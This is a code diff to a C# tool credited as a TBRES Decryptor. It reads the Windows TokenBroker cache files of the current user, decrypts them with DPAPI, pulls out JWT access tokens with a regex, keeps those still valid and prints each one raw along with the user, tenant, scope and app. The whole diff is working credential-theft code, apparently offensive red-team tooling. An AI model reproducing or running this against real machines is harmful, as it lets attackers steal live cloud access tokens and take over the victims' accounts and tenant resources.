@@ -6,6 +6,9 @@ using System.Text.Json;
 using System.Text.Json.Nodes;
 using System.Buffers.Text;
 using System.Runtime.InteropServices;
+using System.Text.RegularExpressions;
+using Newtonsoft.Json;
+using System.IdentityModel.Tokens.Jwt;
 
 namespace TBRES
 {
@@ -17,43 +20,84 @@ namespace TBRES
             return tbresFiles.ToArray();
         }
 
-        public static void OutputDecryptedData(string origFile, string input)
+       
+      
+
+        public static JwtSecurityToken UnprotectTokens(string input)
         {
             try
             {
-                var jsonObject = JsonNode.Parse(input).AsObject();
-                var encodedData = jsonObject["TBDataStoreObject"]["ObjectData"]["SystemDefinedProperties"]["ResponseBytes"]["Value"].ToString();
-                var encryptedData = Convert.FromBase64String(encodedData);
-                var decryptedData = ProtectedData.Unprotect(encryptedData, null, DataProtectionScope.CurrentUser);
-                File.WriteAllBytes(Path.GetFileName(origFile) + ".decrypted", decryptedData);
+                dynamic jsonObject = JsonConvert.DeserializeObject<dynamic>(input);
+                string encodedData = jsonObject["TBDataStoreObject"]["ObjectData"]["SystemDefinedProperties"]["ResponseBytes"]["Value"].ToString();
+                byte[] encryptedData = Convert.FromBase64String(encodedData);
 
-            } catch (System.Exception) {
-                Console.WriteLine("[!] Error Decrypting File: {0}", origFile);
-                return;
+                byte[] decryptedData = ProtectedData.Unprotect(encryptedData, null, DataProtectionScope.CurrentUser);
+
+                string decryptedDataString = Encoding.ASCII.GetString(decryptedData);
+
+                var regeexData = Regex.Matches(decryptedDataString, @"(ey[a-zA-Z0-9_=]+)\.([a-zA-Z0-9_=]+)\.([a-zA-Z0-9_\-\+\/=]*)");
+                if (regeexData.Count > 0)
+                {
+                    foreach (Match regexMatch in regeexData)
+                    {
+                        string token = regexMatch.Value;
+                        JwtSecurityTokenHandler jwsSecHandler = new JwtSecurityTokenHandler();
+                        JwtSecurityToken jwtSecToken = jwsSecHandler.ReadJwtToken(token);
+
+                        if (jwtSecToken.ValidTo > DateTime.Now)
+                            return jwtSecToken;
+                    }
+                }
+
+                return null;
             }
-
-            Console.WriteLine("[*] TBRES Decrypted: {0}.decrypted", Path.GetFileName(origFile));
-
+            catch (Exception ex)
+            {
+                return null;
+            }
         }
 
-        public static string DecryptFiles(string dir)
+        public static List<JwtSecurityToken> UnprotectFiles(string dir)
         {
+            var listOfJwtTokens = new List<JwtSecurityToken>() { };
             foreach (var file in GetFiles(dir))
             {
-                var fileJSON = File.ReadAllText(file, Encoding.Unicode);
-                fileJSON = fileJSON.Substring(0, fileJSON.Length - 1);
-                OutputDecryptedData(file, fileJSON);
+                var fileJSON = System.IO.File.ReadAllText(file, Encoding.Unicode);
+                JwtSecurityToken jwtToken = UnprotectTokens(fileJSON.Substring(0, fileJSON.Length - 1));
+                if (jwtToken != null)
+                {
+                    listOfJwtTokens.Add(jwtToken);
+                }
             }
 
-            return "";
+            return listOfJwtTokens;
         }
+
+       
 
         public static void Main(string[] args)
         {
-            Console.WriteLine("TBRES Decryptor by @_xpn_");
+            Console.WriteLine("TBRES Decryptor by @_xpn_, turned into crap by @flangvik");
 
-            var path = String.Format(@"{0}\Microsoft\TokenBroker\Cache", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData));
-            main.DecryptFiles(path);
+            var tokenPath = String.Format(@"{0}\Microsoft\TokenBroker\Cache", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData));
+            var jwtTokens = UnprotectFiles(tokenPath);
+            foreach (JwtSecurityToken jwtSecurityToken in jwtTokens)
+            {
+                jwtSecurityToken.Payload.TryGetValue("unique_name", out var upn);
+                jwtSecurityToken.Payload.TryGetValue("tid", out var tenantId);
+                jwtSecurityToken.Payload.TryGetValue("aud", out var resourceAccess);
+                jwtSecurityToken.Payload.TryGetValue("scp", out var scope);
+                jwtSecurityToken.Payload.TryGetValue("app_displayname", out var app);
+
+                Console.WriteLine($"-----------------");
+                Console.WriteLine($"User: {upn}");
+                Console.WriteLine($"Resource: {resourceAccess}");
+                Console.WriteLine($"TenantId: {tenantId}");
+                Console.WriteLine($"Scope: {scope}");
+                Console.WriteLine($"App: {app}");
+                Console.WriteLine($"access_token: {jwtSecurityToken.RawData}");
+                Console.WriteLine($"-----------------");
+            }
         }
     }
 }
